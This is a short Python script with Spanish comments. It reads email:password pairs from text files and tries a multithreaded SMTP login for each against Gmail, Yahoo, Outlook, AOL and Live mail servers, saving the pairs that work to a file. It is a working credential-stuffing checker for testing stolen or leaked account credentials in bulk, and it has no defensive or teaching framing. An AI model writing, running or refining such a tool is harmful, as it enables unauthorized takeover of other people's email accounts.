import yagmail
import glob
import threading
import os

# Crear la carpeta "funcionales" si no existe
if not os.path.exists("funcionales"):
    os.makedirs("funcionales")

# Archivo único para guardar todos los correos funcionales
archivo_funcionales = "funcionales/funcionales_todos.txt"

# Configuración de los servidores SMTP según el proveedor
def configurar_servidor(email, password):
    dominio = email.split('@')[-1]
    
    # Lista de servidores SMTP por dominio
    servidores = {
        "gmail.com": "smtp.gmail.com",
        "yahoo.com": "smtp.mail.yahoo.com",
        "hotmail.com": "smtp.office365.com",
        "outlook.com": "smtp.office365.com",
        "aol.com": "smtp.aol.com",
        "live.com": "smtp.live.com",
        "msn.com": "smtp.live.com"
    }
    
    if dominio in servidores:
        return yagmail.SMTP(email, password, host=servidores[dominio])
    else:
        raise Exception(f"Proveedor no soportado: {dominio}")

# Función para probar correos
def probar_correo(email, password, funcionales_lock):
    try:
        # Configurar el servidor SMTP según el proveedor
        servidor = configurar_servidor(email, password)
        servidor.login()
        print(f"Correo funcional: {email}")
        
        # Guardar el correo funcional en el archivo único
        with funcionales_lock:
            with open(archivo_funcionales, "a") as funcionales:
                funcionales.write(f"{email}:{password}\n")
    except Exception as e:
        print(f"Error con la cuenta {email}: {e}")

# Procesar todos los archivos separados por dominio
archivos = glob.glob("*_pruebas.txt")  # Busca todos los archivos *_pruebas.txt
funcionales_lock = threading.Lock()  # Bloqueo para evitar conflictos al escribir en el archivo

for archivo in archivos:
    print(f"Procesando: {archivo}")
    
    with open(archivo, "r") as archivo_dominio:
        lineas = archivo_dominio.readlines()

    # Crear hilos para procesar cada correo
    threads = []
    for linea in lineas:
        email, password = linea.strip().split(":")
        thread = threading.Thread(target=probar_correo, args=(email, password, funcionales_lock))
        threads.append(thread)
        thread.start()

    # Esperar a que todos los hilos terminen
    for thread in threads:
        thread.join()

print(f"Todos los correos funcionales se guardaron en: {archivo_funcionales}")